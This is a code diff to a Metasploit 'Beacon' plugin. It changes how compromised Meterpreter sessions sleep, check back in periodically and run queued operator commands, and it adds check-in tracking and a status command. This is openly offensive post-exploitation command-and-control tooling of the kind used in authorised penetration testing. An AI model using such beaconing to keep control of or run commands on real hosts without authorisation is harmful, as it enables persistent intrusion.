@@ -26,43 +26,48 @@ class Plugin::Beacon < Msf::Plugin
     def initialize(console_driver)
       super
       @beacons = {}
-      @commands = {}
       self.framework.events.add_session_subscriber(self)
     end
 
     def commands
       {
         'beacon_start' => "Start Beaconing - beacon_start [UUID|SESSION] PERIOD",
-        'beacon_stop' => "Stop Beaconing - beacon_stop [UUID|SESSION]",
-        'beacon_commands' => "Run commands on next checkin - beacon_cmd [UUID|SESSION] \"CMD\"",
+        'beacon_stop' => "Stop Beaconing - beacon_stop UUID",
+        'beacon_commands' => "Run commands on next checkin - beacon_cmd UUID *CMDs",
+        'beacon_status' => "Get beacon status"
       }
     end
 
     def on_session_open(session)
       return unless session.type == 'meterpreter'
       uuid = Rex::Text.to_hex(session.core.uuid.puid, "")
-      if @beacons[uuid]
+      beacon_info = @beacons[uuid]
+      period = beacon_info[:period]
+      if period
         Thread.new do
           # We run in a new thread to let the other session handlers
           # have a chance to initialize the UI and load stdapi etc.
           #session.init_ui(self.driver.input, self.driver.output)
           Rex.sleep 10
-          if @commands[uuid]
-            cmds = @commands[uuid]
+          cmds = beacon_info[:commands]
+          if cmds
             print_status "Running #{cmds.length} commands on #{uuid}"
-            begin
-              cmds.each do |cmd|
+            cmds.each do |cmd|
+              begin
                 print_status("Running '#{cmd}' on #{uuid}")
                 session.run_cmd cmd
+              rescue Exception => e
+                print_error("Error running #{cmd} - #{e}")
               end
-            rescue Exception => e
-              print_error("Error running #{cmd} - #{e}")
             end
-            @commands[uuid] = nil
+            beacon_info[:commands] = nil
           end
 
-          print_status "Sleeping #{uuid} #{@beacons[uuid]}s"
-          session.core.transport_sleep @beacons[uuid]
+          @beacons[uuid][:last_checkin] = DateTime.now
+          @beacons[uuid][:next_checkin] = (DateTime.now + period.seconds)
+          print_status "Sleeping #{uuid} #{period}s"
+          session.core.transport_sleep period
+          sleep 5
           session.kill
         end
       end
@@ -97,10 +102,10 @@ class Plugin::Beacon < Msf::Plugin
         end
 
         print_status "Beaconing #{uuid} every #{period}s"
-        @beacons[uuid] = period
         framework.sessions.each do |s|
           if Rex::Text.to_hex(s.last.core.uuid.puid, "") == uuid
-            s.last.core.transport_sleep(period)
+            @beacons[uuid] = { period: period, commands: nil, last_checkin: DateTime.now, next_checkin: (DateTime.now + period.seconds)}
+            s.last.core.transport_sleep period
             sleep 5
             s.last.kill
           end
@@ -114,8 +119,9 @@ class Plugin::Beacon < Msf::Plugin
       if args.length == 1
         uuid = args.shift
         print_status("Stopping #{uuid} beaconing")
-        @beacons[uuid] = nil
-        @commands[uuid] = nil
+        if @beacons[uuid]
+          @beacons[uuid][:period] = nil
+        end
       else
         print_error("Usage: beacon_stop UUID")
       end
@@ -124,10 +130,25 @@ class Plugin::Beacon < Msf::Plugin
     def cmd_beacon_commands(*args)
       if args.length > 1
         uuid = args.shift
-        @commands[uuid] = args
-        print_status "Queueing #{args.length} commands on #{uuid}"
+        if @beacons[uuid]
+          if @beacons[uuid][:commands]
+            @beacons[uuid][:commands] << args
+            @beacons[uuid][:commands].flatten!
+          else
+            @beacons[uuid][:commands] = args
+          end
+          print_status "Queueing #{args.length} commands on #{uuid}"
+        else
+          print_error "Non-beaconing uuid: #{uuid}"
+        end
       else
         print_error("Usage: beacon_commands UUID *CMDS")
+      end
+    end
+
+    def cmd_beacon_status
+      @beacons.each do |k,v|
+        print_line "Beacon #{k} - last checkin #{v[:last_checkin]} - next checkin #{v[:next_checkin]}"
       end
     end
 
